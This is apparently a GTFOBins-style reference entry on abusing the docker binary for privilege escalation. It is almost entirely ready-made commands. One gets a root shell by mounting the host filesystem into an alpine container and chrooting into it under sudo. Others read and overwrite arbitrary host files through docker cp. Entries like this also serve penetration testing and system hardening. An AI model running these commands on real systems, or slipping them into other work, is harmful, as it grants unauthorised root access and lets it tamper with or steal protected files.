description: This requires the user to be privileged enough to run docker, i.e. being in the 'docker' group or being 'root'. Any other Docker Linux image should work, e.g., 'debian'.

shell.description: The resulting is a root shell.

file-write.description: Write a file by copying it to a temporary container and back to the target destination on the host.
file-write.code:
CONTAINER_ID="$(docker run -d alpine)" # or existing
TF=$(mktemp)
echo "DATA" > $TF
docker cp $TF $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF [file]

file-read.description: Read a file by copying it to a temporary container and back to a new location on the host.
file-read.code:
CONTAINER_ID="$(docker run -d alpine)"  # or existing
TF=$(mktemp)
docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF

sudo.description: The resulting is a root shell.
sudo.code: sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh

suid.description: The resulting is a root shell.
